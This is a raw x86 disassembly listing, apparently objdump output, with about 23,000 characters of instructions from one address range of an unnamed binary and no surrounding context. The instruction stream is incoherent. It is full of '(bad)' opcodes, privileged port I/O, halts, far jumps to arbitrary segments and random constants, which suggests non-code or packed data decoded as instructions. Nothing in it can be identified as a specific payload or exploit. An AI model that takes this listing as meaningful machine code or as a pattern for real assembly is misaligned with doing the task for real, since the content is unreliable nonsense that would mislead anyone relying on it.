  409038:	cmp    DWORD PTR [esi],0xbcc21d3a
  40903e:	shl    BYTE PTR [eax-0x20360bef],cl
  409044:	mov    esi,0x1dcd1ad8
  409049:	inc    edx
  40904a:	dec    ebx
  40904b:	xor    al,0x36
  40904d:	dec    eax
  40904e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40904f:	stc    
  409050:	inc    eax
  409051:	sub    edx,DWORD PTR [edi-0x68]
  409054:	push   0x1c
  409056:	out    0x3a,al
  409058:	adc    dh,cl
  40905a:	mov    ds:0x80d709e8,al
  40905f:	ss daa 
  409061:	dec    ebx
  409062:	and    DWORD PTR [esi-0x3],edx
  409065:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409066:	shl    DWORD PTR es:[eax],cl
  409069:	cmp    al,0x41
  40906b:	mov    esi,0xd5126a12
  409070:	ins    DWORD PTR es:[edi],dx
  409071:	fadd   QWORD PTR [ebx]
  409073:	in     eax,0xfb
  409075:	fwait
  409076:	in     al,dx
  409077:	scas   al,BYTE PTR es:[edi]
  409078:	int    0x55
  40907a:	pop    DWORD PTR [ebp-0x76]
  40907d:	dec    esp
  40907e:	sar    BYTE PTR [ebp+0x1e],0xe9
  409082:	push   edx
  409083:	stc    
  409084:	add    eax,0x8f39b9a
  409089:	sbb    BYTE PTR [edi-0x106fbcfe],bl
  40908f:	adc    ebx,esi
  409091:	xor    cl,BYTE PTR [ecx]
  409093:	adc    al,0xcd
  409095:	cwde   
  409096:	pop    edx
  409097:	ss jns 0x4090da
  40909a:	sbb    BYTE PTR [edi],0xc6
  40909d:	(bad)  
  40909e:	stc    
  40909f:	std    
  4090a0:	xor    bl,BYTE PTR [ecx+0x20]
  4090a3:	shr    DWORD PTR cs:0xc5502a68,0x29
  4090ab:	in     al,0xd9
  4090ad:	mov    bl,0xe5
  4090af:	lods   eax,DWORD PTR ds:[esi]
  4090b0:	xor    ebx,DWORD PTR [edx+0x0]
  4090b3:	and    al,0x4d
  4090b5:	gs leave 
  4090b7:	mov    edi,0xa992005f
  4090bc:	mov    WORD PTR [esi+0xf],?
  4090bf:	popf   
  4090c0:	mov    dh,0xb7
  4090c2:	and    al,0xe3
  4090c4:	test   al,dh
  4090c6:	and    al,0x56
  4090c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090c9:	sub    dh,BYTE PTR [edx]
  4090cb:	mov    DWORD PTR [ecx-0x7f],esp
  4090ce:	xor    BYTE PTR [edi],dh
  4090d0:	js     0x4090d9
  4090d2:	xchg   esi,eax
  4090d3:	inc    eax
  4090d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090d5:	ja     0x409140
  4090d7:	(bad)  
  4090d8:	js     0x409126
  4090da:	das    
  4090db:	fisub  WORD PTR [eax+0x62]
  4090de:	fsubr  DWORD PTR [eax-0x781d6261]
  4090e4:	icebp  
  4090e5:	pop    ecx
  4090e6:	and    BYTE PTR [esi],dl
  4090e8:	adc    BYTE PTR [esi+0x31],dh
  4090eb:	ret    
  4090ec:	pop    ebx
  4090ed:	sub    dh,BYTE PTR es:[ebp+0x40c7fc36]
  4090f4:	dec    edi
  4090f5:	fadd   QWORD PTR [ebp-0x25b9012]
  4090fb:	sbb    BYTE PTR [ecx-0x45f48922],ah
  409101:	jb     0x4090e7
  409103:	inc    ecx
  409104:	mov    ch,0x11
  409106:	sbb    DWORD PTR [eax-0x431c5f61],edi
  40910c:	pop    ebp
  40910d:	outs   dx,BYTE PTR ds:[esi]
  40910e:	pop    ebx
  40910f:	mov    dl,0x5b
  409111:	outs   dx,DWORD PTR ds:[esi]
  409112:	inc    ebx
  409113:	ret    
  409114:	push   0x97011e66
  409119:	mov    bh,0xeb
  40911b:	inc    edx
  40911c:	lahf   
  40911d:	sahf   
  40911e:	sub    DWORD PTR [edi+ebp*8-0x25],esp
  409122:	aas    
  409123:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409124:	sub    dh,BYTE PTR [edx-0x27a0b425]
  40912a:	out    dx,al
  40912b:	std    
  40912c:	and    ebp,DWORD PTR [ecx]
  40912e:	dec    ebp
  40912f:	jmp    0x4090b4
  409131:	add    DWORD PTR [ebx-0x3e],esi
  409134:	xchg   esp,eax
  409135:	test   al,0xe9
  409137:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409138:	dec    DWORD PTR ds:0x1ad89c1a
  40913e:	in     al,dx
  40913f:	dec    ebp
  409140:	sbb    eax,0xa7d3a3e9
  409145:	mov    ds:0x29d2d1bc,al
  40914a:	std    
  40914b:	shl    DWORD PTR [eax+0x7d],0xdd
  40914f:	loope  0x4090d8
  409151:	xor    dl,al
  409153:	cdq    
  409154:	not    BYTE PTR [edi]
  409156:	xor    DWORD PTR [eax+0x8],ecx
  409159:	bound  esp,QWORD PTR [edx]
  40915b:	xor    al,0x77
  40915d:	enter  0x97b4,0xf0
  409161:	inc    edx
  409162:	rep ins BYTE PTR es:[edi],dx
  409164:	jo     0x4091b7
  409166:	xor    eax,edi
  409168:	xor    edx,0x7330bc65
  40916e:	out    0xbc,al
  409170:	sub    dl,BYTE PTR [ebp-0x5f]
  409173:	adc    edi,DWORD PTR [edi*2-0x3955b7dc]
  40917a:	ret    0x69ad
  40917d:	push   ebp
  40917e:	stc    
  40917f:	dec    edi
  409180:	xor    BYTE PTR [edi],ch
  409182:	dec    edi
  409183:	repz sub al,0x54
  409186:	jne    0x409193
  409188:	shl    DWORD PTR [ebx-0x2787b51d],1
  40918e:	xchg   ebp,eax
  40918f:	mov    eax,ds:0x4d7c6be5
  409194:	imul   ch
  409196:	sar    DWORD PTR ds:0x3c32f66,1
  40919c:	xor    dl,cl
  40919e:	outs   dx,DWORD PTR ds:[esi]
  40919f:	sbb    ch,BYTE PTR [edi-0x4f621e35]
  4091a5:	cli    
  4091a6:	and    BYTE PTR ds:0xa64a0144,dh
  4091ac:	mov    dh,BYTE PTR [ebx+0x8]
  4091af:	gs cmc 
  4091b1:	dec    esp
  4091b2:	push   eax
  4091b3:	scas   al,BYTE PTR es:[edi]
  4091b4:	push   edi
  4091b5:	sbb    esi,DWORD PTR [ebx-0x6]
  4091b8:	in     eax,dx
  4091b9:	xor    al,0x0
  4091bb:	xchg   ebx,eax
  4091bc:	es xor dl,al
  4091bf:	in     al,dx
  4091c0:	cld    
  4091c1:	add    esp,esp
  4091c3:	add    BYTE PTR [ebp+0x1],ah
  4091c6:	aaa    
  4091c7:	out    0xb0,eax
  4091c9:	outs   dx,DWORD PTR ds:[esi]
  4091ca:	push   ecx
  4091cb:	stc    
  4091cc:	clc    
  4091cd:	fwait
  4091ce:	ret    
  4091cf:	pop    ss
  4091d0:	xor    bh,BYTE PTR [ebx]
  4091d2:	xlat   BYTE PTR ds:[ebx]
  4091d3:	add    BYTE PTR [ebp+0x37],ah
  4091d6:	repnz bound ebp,QWORD PTR [esp]
  4091da:	mov    ds:0xc7e82eee,eax
  4091df:	xor    ebp,ebp
  4091e1:	sbb    DWORD PTR [ebp-0x6f],ebx
  4091e4:	push   cs
  4091e5:	xchg   BYTE PTR [edx-0x68],dl
  4091e8:	shl    BYTE PTR [eax],cl
  4091ea:	dec    edi
  4091eb:	jnp    0x409189
  4091ed:	jne    0x40917b
  4091ef:	lods   al,BYTE PTR ds:[esi]
  4091f0:	or     al,0xd1
  4091f2:	push   ebp
  4091f3:	(bad)  
  4091f5:	xchg   ebx,edi
  4091f7:	mov    ecx,0x50b5d8c1
  4091fc:	out    0x40,al
  4091fe:	fcom   DWORD PTR [esi+0x5def82f8]
  409204:	aad    0x27
  409206:	jb     0x409203
  409208:	jmp    0x1b34:0x8eb7a143
  40920f:	add    BYTE PTR [eax+0x2f],0x95
  409213:	into   
  409214:	jns    0x40920f
  409216:	xchg   edx,eax
  409217:	and    eax,0xe12c144e
  40921c:	jae    0x409277
  40921e:	test   eax,0x56fd4355
  409223:	ins    BYTE PTR es:[edi],dx
  409224:	inc    esi
  409225:	push   ds
  409226:	adc    eax,0x2ad00c1f
  40922b:	out    dx,eax
  40922c:	inc    esi
  40922d:	ja     0x409228
  40922f:	(bad)  
  409231:	push   edx
  409232:	dec    edx
  409233:	daa    
  409234:	cmp    al,0xa8
  409236:	shr    BYTE PTR [edi],0x1e
  409239:	or     dl,dh
  40923b:	push   esp
  40923c:	sub    bl,BYTE PTR ds:0x6e1ce8c1
  409242:	enter  0x3b4,0x2
  409246:	jo     0x4092a3
  409248:	into   
  409249:	pop    edx
  40924a:	xchg   ebx,eax
  40924b:	and    eax,0x350e8c9c
  409250:	ret    
  409251:	inc    ecx
  409252:	jmp    0x6432:0xb865cbbd
  409259:	adc    DWORD PTR [edi+ecx*4+0x3ceabfd0],0xffffffb4
  409261:	imul   esi,edx,0xffffffd2
  409264:	lea    eax,[ebx-0x73]
  409267:	jne    0x4092a2
  409269:	xchg   BYTE PTR [esp+ecx*2],dl
  40926c:	shl    ebp,0x43
  40926f:	mov    ds:0x49e6e0b7,al
  409274:	out    0xee,eax
  409276:	sub    al,0x81
  409278:	imul   edx,edx,0x5e00709b
  40927e:	jbe    0x409271
  409280:	xchg   sp,ax
  409282:	mov    edx,0x2d99ad0
  409287:	fcom   DWORD PTR [esi-0x3d]
  40928a:	outs   dx,BYTE PTR ds:[esi]
  40928b:	das    
  40928c:	loope  0x40922c
  40928e:	(bad)
  409292:	test   DWORD PTR [ecx-0x6b5eac91],ebp
  409298:	mov    esi,0xf785f98
  40929d:	addr16 popf 
  40929f:	dec    esi
  4092a0:	lods   eax,DWORD PTR ds:[esi]
  4092a1:	adc    eax,0xe0ea109
  4092a6:	(bad)  
  4092a8:	shl    esi,1
  4092aa:	aam    0xe
  4092ac:	xchg   edx,eax
  4092ad:	repnz popf 
  4092af:	call   0xa4f7:0x8951ef91
  4092b6:	enter  0xf6a8,0xf9
  4092ba:	les    ebp,FWORD PTR [edx+0x69]
  4092bd:	xchg   esp,eax
  4092be:	pop    ecx
  4092bf:	stos   DWORD PTR es:[edi],eax
  4092c0:	fcmovu st,st(6)
  4092c2:	sub    ebp,DWORD PTR [edi+0x2100b93d]
  4092c8:	adc    al,0x5d
  4092ca:	div    BYTE PTR [edi]
  4092cc:	cmp    eax,DWORD PTR [ebx+edx*2-0x1d]
  4092d0:	or     eax,0xbdb83a9
  4092d5:	in     al,0x6d
  4092d7:	sub    dh,al
  4092d9:	(bad)  
  4092da:	into   
  4092db:	enter  0xcc74,0x9e
  4092df:	imul   ebx,ecx,0x25732270
  4092e5:	mov    cs,ecx
  4092e7:	xor    eax,edi
  4092e9:	imul   esp,DWORD PTR [ecx],0xffffffa2
  4092ec:	lods   al,BYTE PTR ds:[esi]
  4092ed:	test   al,0x9
  4092ef:	push   0xeb72f1c0
  4092f4:	inc    ebx
  4092f5:	adc    eax,0x1401b733
  4092fa:	fidiv  DWORD PTR [edi+edx*2+0x31408b7a]
  409301:	ficomp DWORD PTR [esi-0x7e29336f]
  409307:	popf   
  409308:	sub    DWORD PTR [ebp+0x581bb5fc],ebx
  40930e:	(bad)  
  40930f:	ds mov cl,0x71
  409312:	xor    al,0x92
  409314:	mov    cl,0x14
  409316:	sar    DWORD PTR [edx+0x14],cl
  409319:	dec    esi
  40931a:	les    ebx,FWORD PTR [edx+edi*8]
  40931d:	cld    
  40931e:	inc    ebp
  40931f:	add    al,0x2b
  409321:	add    ebx,DWORD PTR [ebx-0x3d]
  409324:	jecxz  0x4092ed
  409326:	mov    eax,0x7f355b1d
  40932b:	fldcw  WORD PTR [ecx+0x72f5365c]
  409331:	aad    0xa7
  409333:	mov    al,0xd3
  409335:	cli    
  409336:	xchg   esi,eax
  409337:	dec    ebp
  409338:	jnp    0x409363
  40933a:	xor    ch,ch
  40933c:	push   ebp
  40933d:	mul    ebx
  40933f:	xacquire xchg BYTE PTR [ebp+0x5a],ch
  409343:	lock mov BYTE PTR [ebx-0x36ff5810],0x1d
  40934b:	xchg   edi,eax
  40934c:	cmp    al,0x8b
  40934e:	mov    ebx,0x52ce8777
  409353:	jmp    0x4093a8
  409355:	or     eax,0xd6d5c24a
  40935a:	das    
  40935b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40935c:	out    dx,eax
  40935d:	das    
  40935e:	mov    bh,0x71
  409360:	int3   
  409361:	repz shr BYTE PTR [ebx],cl
  409364:	mov    esp,0xea52c090
  409369:	sub    DWORD PTR [edx-0x35fbd84f],esi
  40936f:	mov    BYTE PTR [ecx+edi*8-0x36884761],bh
  409376:	loop   0x4093cf
  409378:	inc    ecx
  409379:	ds xchg ebx,eax
  40937b:	pop    ebx
  40937c:	(bad)  
  40937d:	cdq    
  40937e:	dec    esp
  40937f:	(bad)  
  409380:	jg     0x409319
  409382:	mov    dh,0x53
  409384:	hlt    
  409385:	or     BYTE PTR cs:[eax+0x27],dh
  409389:	xchg   ecx,eax
  40938a:	cld    
  40938b:	xchg   edx,eax
  40938c:	std    
  40938d:	loopne 0x4093e3
  40938f:	mov    BYTE PTR gs:[esi+0x79],ch
  409393:	dec    edx
  409394:	retf   
  409395:	xor    esi,DWORD PTR [eax+0x6a13a85f]
  40939b:	xlat   BYTE PTR ds:[ebx]
  40939c:	dec    ebx
  40939d:	ret    
  40939e:	into   
  40939f:	mov    bl,0xbc
  4093a1:	ins    DWORD PTR es:[edi],dx
  4093a2:	or     ah,dh
  4093a4:	repnz lock imul esp,esi,0x7d
  4093a9:	mov    ecx,0xc99e0ce4
  4093ae:	stos   DWORD PTR es:[edi],eax
  4093af:	loopne 0x409411
  4093b1:	not    BYTE PTR [esp+esi*2+0x3e7beb27]
  4093b8:	xor    DWORD PTR [esi-0x40],eax
  4093bb:	cs add dl,dl
  4093be:	push   eax
  4093bf:	fistp  DWORD PTR [eax-0x1c8af938]
  4093c5:	and    eax,0x77e3d05e
  4093ca:	out    0xef,eax
  4093cc:	mov    cl,0x5e
  4093ce:	push   esi
  4093cf:	stos   BYTE PTR es:[edi],al
  4093d0:	adc    BYTE PTR ss:0x9d7c8d63,0x55
  4093d8:	push   esi
  4093d9:	dec    ecx
  4093da:	aas    
  4093db:	jecxz  0x40942f
  4093dd:	pop    ds
  4093de:	int    0xde
  4093e0:	pop    esp
  4093e1:	xchg   ebx,eax
  4093e2:	sbb    BYTE PTR [ebx+0x20d69568],dh
  4093e8:	mov    ch,0xdb
  4093ea:	pushf  
  4093eb:	enter  0x7b52,0x3
  4093ef:	(bad)  [ebx-0x54a03205]
  4093f5:	mov    BYTE PTR [ecx-0x63],ah
  4093f8:	jmp    0x4093ec
  4093fa:	test   al,0x6e
  4093fc:	push   ebx
  4093fd:	mov    cl,0x31
  4093ff:	fisttp QWORD PTR [esi+0x2d]
  409402:	loopne 0x409432
  409404:	inc    ebp
  409405:	add    DWORD PTR [ebx+0x5164dcf8],ecx
  40940b:	push   ebx
  40940c:	pusha  
  40940d:	push   ebx
  40940e:	repz dec ebx
  409410:	mov    BYTE PTR [ebx+0x1dfc4ea0],ah
  409416:	adc    dl,bl
  409418:	and    bl,BYTE PTR [esi-0x26]
  40941b:	mov    dl,0x26
  40941d:	pop    ebx
  40941e:	inc    ecx
  40941f:	int    0x67
  409421:	cmc    
  409422:	not    BYTE PTR [ebx-0x4758bd30]
  409428:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409429:	fld    TBYTE PTR [ebp+0x684e8382]
  40942f:	and    eax,0xda992b4b
  409434:	ficomp DWORD PTR [ecx+esi*4]
  409437:	mov    ds:0x533a2433,al
  40943c:	nop
  40943d:	int3   
  40943e:	xor    dh,dl
  409440:	push   esp
  409441:	dec    ecx
  409442:	jp     0x4093d0
  409444:	or     BYTE PTR [ebp+ecx*2+0x41],dl
  409448:	pop    edx
  409449:	mov    al,0xf4
  40944b:	lods   al,BYTE PTR ds:[esi]
  40944c:	jbe    0x4093d6
  40944e:	inc    ebx
  40944f:	mov    ds:0x19f07199,eax
  409454:	xchg   esi,eax
  409455:	js     0x40940e
  409457:	mov    ebp,0x8a9263a8
  40945c:	push   cs
  40945d:	fs sub esp,edi
  409460:	xor    eax,0xf97d13b2
  409465:	stos   DWORD PTR es:[edi],eax
  409466:	jecxz  0x4094e5
  409468:	xor    edi,esi
  40946a:	sub    al,0x79
  40946c:	push   edi
  40946d:	cli    
  40946e:	out    0x7a,eax
  409470:	or     al,BYTE PTR [edi+ebx*2+0x3]
  409474:	(bad)  
  409475:	inc    edi
  409476:	xchg   esi,eax
  409477:	loop   0x4094f2
  409479:	and    DWORD PTR [ebx+ebp*2-0xb482abc],eax
  409480:	sub    DWORD PTR [eax+eax*2+0x1b],edx
  409484:	or     al,0xc1
  409486:	test   eax,0xaeeda62c
  40948b:	xchg   edx,eax
  40948c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40948d:	gs scas eax,DWORD PTR es:[edi]
  40948f:	sub    ch,BYTE PTR [eax+0x44]
  409492:	push   esp
  409493:	mov    ebp,0x54bb6444
  409498:	pop    edi
  409499:	cs addr16 inc esi
  40949c:	out    dx,al
  40949d:	mov    bh,0x28
  40949f:	shr    DWORD PTR [edx-0x3],1
  4094a2:	push   eax
  4094a3:	rcr    cl,cl
  4094a5:	js     0x4094d0
  4094a7:	into   
  4094a8:	nop
  4094a9:	push   ss
  4094aa:	fmul   QWORD PTR [ecx-0x70]
  4094ad:	push   ebx
  4094ae:	fstp   QWORD PTR [ecx]
  4094b0:	mov    eax,0x9067d28f
  4094b5:	mov    ecx,0x98a31df5
  4094ba:	cmp    ebx,DWORD PTR [ebp+0x35]
  4094bd:	adc    ch,BYTE PTR [eax-0x55]
  4094c0:	xor    cl,BYTE PTR [ebx+ecx*8+0x44]
  4094c4:	int    0x16
  4094c6:	xchg   ebp,eax
  4094c7:	dec    eax
  4094c8:	js     0x409508
  4094ca:	add    edx,ebx
  4094cc:	shr    DWORD PTR [edx],cl
  4094ce:	fst    DWORD PTR [ebx]
  4094d0:	mov    eax,ds:0x136d6d51
  4094d5:	mov    dl,BYTE PTR [eax+0x559aa415]
  4094db:	(bad)  
  4094dd:	adc    eax,0x51c94c34
  4094e2:	je     0x409527
  4094e4:	dec    esi
  4094e5:	fs mov esi,0x7ab558a6
  4094eb:	push   ebx
  4094ec:	mov    bl,0x77
  4094ee:	mov    ds:0x36d3c507,al
  4094f3:	dec    esp
  4094f4:	push   ds
  4094f5:	in     al,dx
  4094f6:	sbb    ah,ch
  4094f8:	test   eax,0x5b798ead
  4094fd:	push   cs
  4094fe:	mov    dh,0x14
  409500:	push   0x1c8bb9dd
  409505:	sbb    eax,0xe742c945
  40950a:	into   
  40950b:	test   BYTE PTR [ebx+0x972f29a],dl
  409511:	ss sbb al,0x9d
  409514:	les    edx,FWORD PTR [ecx-0xc]
  409517:	pop    eax
  409518:	or     BYTE PTR [esi+ebp*8-0x319028a7],dl
  40951f:	shl    BYTE PTR [edi],1
  409521:	ror    BYTE PTR [ebx+edi*1],1
  409524:	dec    ebp
  409525:	mov    al,ds:0xb2594029
  40952a:	inc    edi
  40952b:	(bad)  
  40952d:	shl    BYTE PTR [eax],1
  40952f:	sub    bh,BYTE PTR [edx-0x27076846]
  409535:	mov    ds:0x252b177a,al
  40953a:	push   ss
  40953b:	fstp   DWORD PTR [ecx]
  40953d:	jno    0x4094bf
  40953f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409540:	loope  0x40952e
  409542:	aam    0x4a
  409544:	jo     0x40950c
  409546:	fdiv   st,st(0)
  409548:	clc    
  409549:	test   eax,0x78dda58b
  40954e:	std    
  40954f:	pop    esp
  409550:	not    al
  409552:	push   edi
  409553:	pop    esp
  409554:	sub    BYTE PTR [ebx+0x69517234],ah
  40955a:	push   esi
  40955b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40955c:	sbb    eax,0x928edb99
  409561:	stc    
  409562:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409563:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409564:	cmp    ch,bl
  409566:	cdq    
  409567:	retf   
  409568:	fsub   QWORD PTR [ebx]
  40956a:	mov    edx,0x6aa56bd1
  40956f:	ret    
  409570:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409571:	lock push edx
  409573:	adc    bl,BYTE PTR cs:[ecx+0x9]
  409577:	loopne 0x409526
  409579:	or     DWORD PTR [edi-0x3585ea01],ebx
  40957f:	das    
  409580:	inc    DWORD PTR [esi+edi*8-0x64]
  409584:	xor    dl,BYTE PTR [eax+0x44406b58]
  40958a:	iret   
  40958b:	sbb    eax,0xf6ac80d8
  409590:	pop    edx
  409591:	mov    bh,0x32
  409593:	cli    
  409594:	pop    esi
  409595:	lods   eax,DWORD PTR ds:[esi]
  409596:	(bad)  
  409597:	fcomp  QWORD PTR [ebp-0x36f87bf2]
  40959d:	sub    ecx,ebx
  40959f:	dec    edx
  4095a0:	fsub   st(5),st
  4095a2:	jl     0x4095ce
  4095a4:	shl    DWORD PTR [ecx+eiz*2],1
  4095a7:	or     BYTE PTR [edx-0x25],0x76
  4095ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095ac:	repnz stos BYTE PTR es:[edi],al
  4095ae:	xor    eax,ebx
  4095b0:	pop    eax
  4095b1:	ror    DWORD PTR [edx],0x53
  4095b4:	fdiv   st,st(0)
  4095b6:	xchg   esi,eax
  4095b7:	or     al,0xa7
  4095b9:	mov    dh,0xf5
  4095bb:	pushf  
  4095bc:	es pushf 
  4095be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095bf:	push   esp
  4095c0:	ss ins BYTE PTR es:[edi],dx
  4095c2:	test   bl,0x86
  4095c5:	and    BYTE PTR [ebp+0x7bb8c4c9],bh
  4095cb:	cmp    edx,DWORD PTR [edi]
  4095cd:	lock cmp al,BYTE PTR [ecx+eax*2+0x1009e59c]
  4095d5:	cmp    bh,BYTE PTR [ebp+0x6f261c65]
  4095db:	mov    esp,0x764ff3d5
  4095e0:	xchg   esp,eax
  4095e1:	jo     0x4095af
  4095e3:	pop    ss
  4095e4:	xchg   BYTE PTR [ebp+0x213e82ab],al
  4095ea:	iret   
  4095eb:	lock inc esp
  4095ed:	push   ds
  4095ee:	dec    esi
  4095ef:	mov    ebp,0x7e5f94d8
  4095f4:	lea    eax,[ebp+0x1e6f4124]
  4095fa:	or     DWORD PTR [edi-0x3227a08d],ebx
  409600:	push   ebp
  409601:	fs pop ds
  409603:	jbe    0x4095b2
  409605:	add    DWORD PTR fs:[edi],edx
  409608:	mov    ah,0xa2
  40960a:	test   DWORD PTR [esi-0x4e1ecae4],esp
  409610:	mov    ds:0xeda2736f,al
  409615:	ret    
  409616:	xlat   BYTE PTR ds:[ebx]
  409617:	fs stos DWORD PTR es:[edi],eax
  409619:	mov    al,ds:0xc0373edc
  40961e:	mov    ds:0xc0a4dd5a,eax
  409623:	lods   al,BYTE PTR gs:[esi]
  409625:	lahf   
  409626:	jne    0x4095c3
  409628:	pop    ss
  409629:	jecxz  0x409663
  40962b:	pop    esp
  40962c:	mov    bl,0x9f
  40962e:	mov    ebp,0xce8aedba
  409633:	popa   
  409634:	paddusw mm5,QWORD PTR [esp+ecx*4]
  409638:	fsubr  QWORD PTR [ecx]
  40963a:	fistp  WORD PTR [eax-0x45]
  40963d:	test   al,0xa
  40963f:	call   0xb82ba9e1
  409644:	leave  
  409645:	mov    ch,BYTE PTR [eax-0x71c235c2]
  40964b:	jl     0x40967c
  40964d:	call   0x4b9d:0xfe9c009e
  409654:	sub    ebp,edx
  409656:	stos   DWORD PTR es:[edi],eax
  409657:	in     al,0x84
  409659:	xchg   edx,eax
  40965a:	ja     0x4096d4
  40965c:	enter  0xc2af,0xab
  409660:	push   ebp
  409661:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409662:	ins    DWORD PTR es:[edi],dx
  409663:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409664:	mov    ds:0xa5fcba4,al
  409669:	sbb    BYTE PTR [edi+0x376aa0d7],dh
  40966f:	pop    esp
  409670:	cmp    bh,BYTE PTR [ecx-0x44]
  409673:	or     cl,BYTE PTR [eax+0x28]
  409676:	add    ah,BYTE PTR [eax-0x57934719]
  40967c:	adc    al,0x8b
  40967e:	sbb    al,0x36
  409680:	push   edi
  409681:	mov    DWORD PTR [edi-0x60],esp
  409684:	inc    ecx
  409685:	inc    edi
  409686:	lock inc edx
  409688:	nop
  409689:	xor    BYTE PTR [ebx],dh
  40968b:	pop    eax
  40968c:	pop    eax
  40968d:	sbb    eax,0x77153000
  409692:	fisub  DWORD PTR [edx-0x3b6091ea]
  409698:	mov    cl,0xa9
  40969a:	sbb    al,0x8
  40969c:	adc    al,0x80
  40969e:	sbb    DWORD PTR [ebp-0x4e],esi
  4096a1:	addr16 push edx
  4096a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096a4:	sbb    BYTE PTR [ecx+eiz*8-0x559e359e],bl
  4096ab:	nop
  4096ac:	cmp    ch,BYTE PTR [eax-0x70]
  4096af:	cmp    DWORD PTR [ebp+edi*2-0x41],ecx
  4096b3:	je     0x409654
  4096b5:	xor    edi,DWORD PTR [eax]
  4096b7:	mov    dh,0xa6
  4096b9:	cmp    esi,DWORD PTR [ecx+0xb]
  4096bc:	inc    eax
  4096bd:	stos   BYTE PTR es:[edi],al
  4096be:	inc    esi
  4096bf:	je     0x4096a1
  4096c1:	or     BYTE PTR [ebp+0x79],al
  4096c4:	stos   DWORD PTR es:[edi],eax
  4096c5:	fst    st(0)
  4096c7:	add    al,BYTE PTR [edx+esi*2]
  4096ca:	pop    ss
  4096cb:	rcr    DWORD PTR [ebp+0x46c4b56c],1
  4096d1:	push   ecx
  4096d2:	fiadd  DWORD PTR [ecx]
  4096d4:	dec    ecx
  4096d5:	(bad)  
  4096d6:	adc    eax,0xad3a55c6
  4096db:	jo     0x409749
  4096dd:	pop    edx
  4096de:	lahf   
  4096df:	adc    BYTE PTR [eax],ch
  4096e1:	cs dec ebp
  4096e3:	jge    0x409689
  4096e5:	add    DWORD PTR [edi+ebp*1],esp
  4096e8:	cmp    eax,0x2c328bd2
  4096ed:	nop
  4096ee:	and    bl,BYTE PTR [ecx]
  4096f0:	fcom   QWORD PTR [ecx+eiz*4]
  4096f3:	(bad)
  4096f7:	pop    edi
  4096f8:	mov    ch,0x50
  4096fa:	pop    edi
  4096fb:	sbb    eax,0x9fcd2abd
  409700:	lds    edi,FWORD PTR [ecx+0x61]
  409703:	test   al,0xc0
  409705:	int    0x70
  409707:	iret   
  409708:	clc    
  409709:	sub    ebx,esp
  40970b:	pushf  
  40970c:	fmul   st,st(6)
  40970e:	cmp    ah,BYTE PTR [ecx]
  409710:	add    al,0x10
  409712:	cwde   
  409713:	(bad)  
  409714:	ss in  al,dx
  409716:	adc    edx,DWORD PTR [ebp+0x1f]
  409719:	mov    cs,WORD PTR [edx+0x5987d2cb]
  40971f:	dec    esi
  409720:	int    0xdc
  409722:	fstp   TBYTE PTR [ebx+0x5e99ac0b]
  409728:	iret   
  409729:	ins    BYTE PTR es:[edi],dx
  40972a:	pusha  
  40972b:	pop    es
  40972c:	repnz shl eax,1
  40972f:	pop    esp
  409730:	xor    edi,ebx
  409732:	cmc    
  409733:	ss cmp dh,al
  409736:	outs   dx,BYTE PTR ds:[esi]
  409737:	cs push eax
  409739:	rol    BYTE PTR [ebp+0x3],0xa1
  40973d:	or     al,0xb
  40973f:	sub    DWORD PTR [ebp-0x52],0x213f87a6
  409746:	gs js  0x409758
  409749:	mov    BYTE PTR [ecx+ebp*2-0x9],dh
  40974d:	clc    
  40974e:	hlt    
  40974f:	cli    
  409750:	aaa    
  409751:	loop   0x4097ca
  409753:	cld    
  409754:	rcr    BYTE PTR [edi-0x4f5019c9],cl
  40975a:	inc    bp
  40975c:	test   BYTE PTR [bx+0x57],0x29
  409761:	cmp    eax,0x3f8c1e5b
  409766:	rdtsc  
  409768:	std    
  409769:	sbb    eax,0xf8341135
  40976e:	jb     0x4096f7
  409770:	jmp    0xf37483aa
  409775:	scas   ax,WORD PTR es:[edi]
  409777:	ret    
  409778:	pop    ebx
  409779:	jg     0x4097c6
  40977b:	cwde   
  40977c:	mov    esi,0xf4f55dfe
  409781:	int    0x79
  409783:	int    0xfe
  409785:	in     eax,0xc1
  409787:	or     eax,0xae83edaf
  40978c:	mov    esi,DWORD PTR [ecx-0x7d9c84f0]
  409792:	cmp    al,0x37
  409794:	shr    DWORD PTR [edx-0x267ee17],0xcd
  40979b:	pop    ss
  40979c:	mov    ebp,0x1f98caeb
  4097a1:	retf   
  4097a2:	jge    0x409815
  4097a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097a5:	dec    eax
  4097a6:	cmp    al,0x79
  4097a8:	dec    esi
  4097a9:	nop
  4097aa:	pushf  
  4097ab:	jle    0x4097d1
  4097ad:	mov    ch,0x18
  4097af:	jno    0x4097d0
  4097b1:	push   ss
  4097b2:	nop
  4097b3:	mov    DWORD PTR ds:0xcb0119a1,ebp
  4097b9:	popf   
  4097ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097bb:	pop    ax
  4097bd:	xchg   ebx,eax
  4097be:	outs   dx,BYTE PTR ds:[esi]
  4097bf:	add    eax,0x98803ffa
  4097c4:	ret    0x6a92
  4097c7:	push   edi
  4097c8:	dec    esp
  4097ca:	add    eax,0x8577294a
  4097cf:	dec    ebx
  4097d0:	jg     0x4097d4
  4097d2:	or     bl,al
  4097d4:	repnz and BYTE PTR ds:0x4bbdb151,bl
  4097db:	lock or ebp,esp
  4097de:	not    esi
  4097e0:	sbb    ecx,DWORD PTR [edi]
  4097e2:	jmp    0x4097ca
